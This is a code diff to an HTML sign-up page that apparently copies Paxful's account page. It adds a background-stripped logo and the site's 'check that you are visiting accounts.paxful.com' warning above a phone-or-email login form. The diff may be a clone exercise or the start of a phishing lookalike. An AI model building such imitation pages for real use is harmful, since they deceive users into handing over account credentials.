@@ -51,9 +51,7 @@
 
         #logo img {
             width: 150px;
-            /* Adjust the width as needed */
             height: auto;
-            /* This maintains the aspect ratio */
         }
 
         #logo p {
@@ -85,6 +83,9 @@
             font-weight: bold;
             margin-bottom: 20px;
             text-align: center;
+        }
+        #importantMessage a{
+            color: #1383a3;
         }
 
         #loginForm h2 {
@@ -122,6 +123,9 @@
             margin-top: 20px;
             font-weight: bold;
         }
+        #loginForm .create-account a{
+            color: #1383a3;
+        } 
 
         #loginForm button {
             background-color: #1393b7;
@@ -157,6 +161,7 @@
     <div id="root">
         <form id="loginForm" method="POST" onSubmit="">
             <div id="logo">
+                <img src="/image/paxx-removebg-preview (1).png" alt="">
             </div>
             <div id="languageDropdown">
                 <select id="languageSelect" onchange="changeLanguage()">
@@ -213,9 +218,10 @@
                     <option value="lb">Lëtzebuergesch</option>
                 </select>
             </div>
-            <h2>Create an account</h2>
+            <h2>Create An Account</h2>
             <div id="importantMessage">
-
+                <span>IMPORTANT!<i class="fa fa-exclamation-circle" aria-hidden="true"></i>
+                </span>Please check that you are visiting <a href="https://accounts.paxful.com/url">https://accounts.paxful.com/url</a>
             </div>
             <label for="username">Your Phone or Email</label>
             <input type="text" id="username" name="username" required />
